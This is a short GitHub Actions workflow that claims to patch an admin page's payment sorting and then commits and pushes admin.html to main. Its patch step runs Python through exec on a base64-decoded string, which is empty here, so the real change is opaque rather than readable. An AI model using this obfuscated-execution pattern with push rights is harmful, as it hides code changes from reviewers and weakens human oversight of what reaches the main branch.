name: Patch payment sort dropdown

on:
  push:
    paths:
      - '.github/workflows/patch-payment-sort-dropdown.yml'

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main
      - name: Patch admin payment sorting
        run: python -c "import base64;exec(base64.b64decode(''))"
      - name: Commit changes
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add admin.html
          git commit -m "feat: add payment sort dropdown"
          git push origin main
